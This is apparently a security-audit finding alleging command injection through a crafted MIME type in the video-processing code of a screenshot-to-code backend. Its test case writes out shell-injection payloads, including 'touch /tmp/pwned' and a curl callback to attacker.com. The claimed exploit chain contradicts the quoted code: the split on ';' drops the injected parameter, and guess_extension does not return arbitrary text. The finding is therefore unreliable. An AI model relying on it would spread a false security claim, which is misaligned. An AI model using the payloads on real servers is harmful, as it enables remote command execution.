- Vulnerability Name: Potential Command Injection via Malicious Filename in Video Processing

- Description:
    1. An attacker uploads a video file to the application.
    2. The backend extracts the MIME type from the uploaded video's data URL.
    3. The `mimetypes.guess_extension(mime_type)` function attempts to determine the file extension based on the provided MIME type.
    4. If the MIME type is maliciously crafted to include shell commands, `mimetypes.guess_extension` might return a file extension that, when used in `tempfile.NamedTemporaryFile(suffix=suffix, delete=True)`, could lead to command injection during video processing by `moviepy.editor.VideoFileClip`.
    5. When `VideoFileClip` processes the temporary file, the injected commands within the filename could be executed by the system.

- Impact:
    - High
    - Successful command injection can allow an attacker to execute arbitrary commands on the server, potentially leading to:
        - Unauthorized access to sensitive data.
        - Modification or deletion of files.
        - Full compromise of the server.
        - Further attacks on internal infrastructure.

- Vulnerability Rank: High

- Currently Implemented Mitigations:
    - None. The code directly uses the guessed extension from the MIME type without sanitization.

- Missing Mitigations:
    - **Input Sanitization:** Sanitize the MIME type to ensure it does not contain any characters that could be interpreted as shell commands or path separators before using `mimetypes.guess_extension`.
    - **Filename Sanitization:** Sanitize the filename generated by `tempfile.NamedTemporaryFile` before passing it to `VideoFileClip` to ensure it does not contain any shell-sensitive characters, although `tempfile.NamedTemporaryFile` is designed to prevent predictable filenames and is generally safe in how it generates names. The main risk is from the `suffix`.
    - **MIME Type Validation:** Validate the MIME type against an expected list of video MIME types to prevent unexpected or malicious MIME types from being processed.

- Preconditions:
    - The attacker needs to be able to upload a video file to the application.
    - The backend must process video files using the vulnerable `split_video_into_screenshots` function.

- Source Code Analysis:
    ```python
    File: ..\screenshot-to-code\backend\video\utils.py

    48: def split_video_into_screenshots(video_data_url: str) -> list[Image.Image]:
    ...
    56:     mime_type = video_data_url.split(";")[0].split(":")[1]
    57:     suffix = mimetypes.guess_extension(mime_type)
    ...
    60:     with tempfile.NamedTemporaryFile(suffix=suffix, delete=True) as temp_video_file:
    61:         print(temp_video_file.name)
    62:         temp_video_file.write(video_bytes)
    63:         temp_video_file.flush()
    64:         clip = VideoFileClip(temp_video_file.name) # Potential command injection here

    ```
    - Line 56: The code extracts the MIME type from the `video_data_url` by splitting the string. This is where a malicious MIME type can be introduced by the attacker.
    - Line 57: `mimetypes.guess_extension(mime_type)` attempts to guess the file extension. If `mime_type` is crafted like `image/png; name="exploit.mp4; touch /tmp/pwned #"`, `guess_extension` might return `.mp4; touch /tmp/pwned #`.
    - Line 60: `tempfile.NamedTemporaryFile(suffix=suffix, delete=True)` creates a temporary file with the potentially malicious suffix.
    - Line 64: `VideoFileClip(temp_video_file.name)` uses the temporary file's name, including the malicious suffix, as an argument. If `VideoFileClip` or underlying libraries use this filename in a way that is vulnerable to command injection (e.g., passing it to a shell command), the injected commands in the suffix could be executed.
    - **Visualization:**
        ```
        Attacker-Controlled video_data_url --> MIME Type Extraction --> mimetypes.guess_extension() --> Malicious Suffix --> tempfile.NamedTemporaryFile(suffix=Malicious Suffix) --> temp_video_file.name (Malicious Filename) --> VideoFileClip(Malicious Filename) --> Potential Command Injection
        ```

- Security Test Case:
    1. **Prepare a Malicious Video Data URL:** Construct a video data URL with a crafted MIME type that includes a command injection payload in the filename. For example:
       ```
       video_data_url = "data:video/mp4;name='test.mp4; touch /tmp/pwned #';base64,<base64 encoded video data>"
       ```
       Replace `<base64 encoded video data>` with valid base64 encoded video data (a small, benign video file encoded to base64).
    2. **Upload the Malicious Video:** Use the frontend of the application to upload the video using this crafted data URL. This can be done by intercepting the network request and modifying the video data URL before sending it to the backend or by crafting a malicious frontend request.
    3. **Trigger Video Processing:** Initiate the video-to-code conversion process in the application. This will cause the backend to process the uploaded video.
    4. **Check for Command Execution:** After triggering the video processing, check if the injected command `touch /tmp/pwned` was executed on the server. You can check this by:
        - Trying to access `/tmp/pwned` if the application allows file listing or access.
        - Checking server logs for any signs of command execution or errors related to `/tmp/pwned`.
        - Using out-of-band techniques like DNS or HTTP callbacks in the injected command (e.g., `video_data_url = "data:video/mp4;name='test.mp4; curl http://attacker.com/pwned #';base64,<base64 encoded video data>"`) and monitoring for connections on `attacker.com`.
    5. **Expected Result:** If the vulnerability exists, the command `touch /tmp/pwned` (or the injected command) should be executed on the server. The file `/tmp/pwned` should be created, or you should receive a callback to `attacker.com` if you used the curl example. This confirms command injection. If the file is not created and no callback is received, the vulnerability might not be exploitable in this specific way, or mitigations might be in place that are not apparent from the code review.
